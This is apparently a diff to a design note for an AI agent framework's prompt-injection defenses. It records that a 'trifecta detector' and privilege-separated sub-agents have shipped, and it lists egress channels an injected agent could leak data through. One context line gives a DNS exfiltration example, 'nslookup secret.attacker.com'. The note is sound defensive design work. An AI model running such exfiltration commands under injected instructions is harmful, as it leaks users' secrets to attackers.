@@ -23,8 +23,10 @@ axis.
 
 Related long-form notes (the entries below that already grew one):
 
-- [`trifecta-detector.md`](trifecta-detector.md) — the static
-  capability-presence check.
+- `book/trifecta-detector.md` + {Pikuri::Trifecta} — the static
+  capability-presence check, **shipped**;
+  [`trifecta-detector.md`](trifecta-detector.md) keeps only its two
+  unanswered questions.
 - [`private-context-taint.md`](private-context-taint.md) — the runtime
   private-in → sever-egress enforcement (and the long-form home of the
   egress-allowlist idea below).
@@ -41,9 +43,9 @@ Related long-form notes (the entries below that already grew one):
 The structural defense (privilege-separated `RESEARCHER` and
 `FILE_MINER` sub-agents) shipped and is documented in
 [`../SECURITY.md`](../SECURITY.md) §"Prompt injection". The biggest
-adjacent idea — a **structural trifecta detector** — has its own
-long-form note, [`trifecta-detector.md`](trifecta-detector.md).
-Shorter adjacent ideas still on the table:
+adjacent idea — a **structural trifecta detector** — shipped, and is
+taught in `book/trifecta-detector.md`. Shorter adjacent ideas still on
+the table:
 
 - **Provenance tags around tool output** in the context render
   (untrusted-content markers). Cheap, partial — empirical
@@ -92,8 +94,8 @@ fetches them; error messages echoed back into follow-up turns; the
 LLM provider itself when non-local. DNS exfil
 (`nslookup secret.attacker.com`) is sneaky — 60+ bytes per query, and
 most egress firewalls don't filter port 53. This is why the trifecta
-detector's `:egress` leg must be tagged generously (see
-[`trifecta-detector.md`](trifecta-detector.md)) and why the killed
+detector's `:egress` leg is tagged generously (an undeclared tool is
+presumed to hold it — {Pikuri::Tool::TrifectaLegs::ASSUMED}), and why the killed
 `fetch` whitelist can't be rescued by URL-shape heuristics (see
 [`private-context-taint.md`](private-context-taint.md)).
 
